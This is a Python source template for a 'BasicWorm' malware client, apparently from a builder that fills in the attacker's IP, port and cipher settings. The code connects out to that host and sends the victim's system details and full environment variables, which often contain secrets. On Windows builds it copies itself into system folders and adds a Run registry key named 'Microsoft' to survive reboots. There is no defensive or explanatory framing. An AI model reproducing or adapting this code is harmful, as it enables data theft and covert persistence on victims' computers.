


import socket
import platform
import os
import threading


from time import sleep
from threading import Thread
from typing import Union

{%if INFECT_WIN %}
import shutil
import winreg
import sys
import ctypes
from ctypes import wintypes
{%endif%}

class BasicWorm:
    def __init__(self):
        self.name = "BasicWorm"
        self.ip = "{{IP}}"
        self.port = {{PORT}}
        self.addr = (self.ip, self.port)
        self.format = "{{FORMAT_CODE}}"
        self.raw_len = {{RAW_LEN}}
        self.Cham = Chameleon(self.format)
        self.pause_conn = {{WORM_PAUSE_CONN}}
        self.sys_msg = "{{MSG_SYS_HEADERS}}"
        self._sendLock = threading.Lock()
        self._sysInfo = "Unknown"
        self._sysEnv = "Unknown"
        self._procInfo = "Unknown"
        self._platform = "Unknown"
        self._networkName = "Unknown"
    

    def buildSocket(self) -> bool:
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Socket Build")
            return True
        except OSError:
            return False
    
    def connect(self) -> bool:
        try:
            self.socket.connect(self.addr)
            print("Connected")
            return True
        except ConnectionRefusedError:
            print("Odrzucono połączenie")
            return False
        except:
            return False
    
    def closeSocket(self) -> None:
        try:
            self.socket.close()
        except:
            pass
    
    def sendMsg(self, msg : str) -> None:
        try:
            msg = self.Cham.encrypt(msg)
        except:
            return
        try:
            with self._sendLock:
                self.socket.sendall(msg)
        except:
            return


    def reciveMsg(self) -> Union[str, bool]:
        msg = b""
        while True:
            try:
                recv = self.socket.recv(self.raw_len)
            except:
                return None
            if recv:
                if len(recv) < self.raw_len:
                    msg += recv
                    break
                else:
                    msg += recv
            else:
                return None
        try:
            msg = self.Cham.decrypt(msg)
            return msg
        except:
            return " "       
    

    def makeSysMsg(self, cmd : list) -> str:
        msg = self.sys_msg + self.sys_msg.join(cmd) + self.sys_msg
        return msg
    

    def getSysInfo(self) -> None:
        self._sysInfo = f"{platform.system()} ## {platform.release()}"
        self._sysEnv = os.environ
        self._platform = str(platform.platform())
        self._networkName = str(platform.node())
        self._procInfo = str(platform.processor())
        try:
            env = ""
            for k,i in self._sysEnv.items():
                env += f"\n{k}  --  {i}"
        except:
            env = "Unknown"
        info = ["i", self.name, self._sysInfo, env, self._platform, self._networkName, self._procInfo]
        for i in range(len(info)):
            if info[i] == "":
                info[i] = "Unknown"
        info = self.makeSysMsg(info)
        self.sendMsg(info)

{%if INFECT_WIN %}
    
    def getSysPath(self) -> list:
        pnumber = [2, 13, 14, 20, 26, 35, 36, 37, 38, 39, 42] 
        shell32 = ctypes.windll.shell32
        buff = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
        sys_path = []
        for n in pnumber:
            result = shell32.SHGetFolderPathW(None, n, None, 0, buff)
            if result == 0:
                sys_path.append(buff.value)
        return sys_path

    def regAddStart(self, fpath: str) -> bool:
        try:
            path = winreg.HKEY_CURRENT_USER
            key = winreg.OpenKeyEx(path, "Software\\Microsoft\\Windows\\CurrentVersion")
            new_key = winreg.CreateKey(key, "Run")
            winreg.SetValueEx(new_key, "Microsoft", 0, winreg.REG_SZ, fpath)
            return True
        except:
            return False

    def cloning(self, fpath: str) -> Union[bool, str]:
        me = os.path.abspath(sys.argv[0])
        try:
            shutil.copy2(me, fpath)
            new = os.path.join(fpath, os.path.basename(me))
            if os.path.exists(new):
                return new
            else:
                return None
            return os.path.join(fpath, os.path.basename(me))
        except:
            return None

    def cloneMe(self) -> None:
        loc = self.getSysPath()
        for fl in loc:
            fpa = self.cloning(fl)
            if fpa:
                if self.regAddStart(fpa):
                    return True
{%endif%}
    

    def START(self) -> None:
{%if INFECT_WIN%}
        self.cloneMe()
{%endif%}
        while True:
            if not self.buildSocket():
                sleep(self.pause_conn)
                continue
            if not self.connect():
                sleep(self.pause_conn)
                self.closeSocket()
                continue
            self.getSysInfo()
            sleep(0.2)
            if self.Work():
                continue
            sleep(1)
            print("Close Client")
            self.closeSocket()
            break

              
    def Work(self) -> bool:
        sleep(3)
        return False
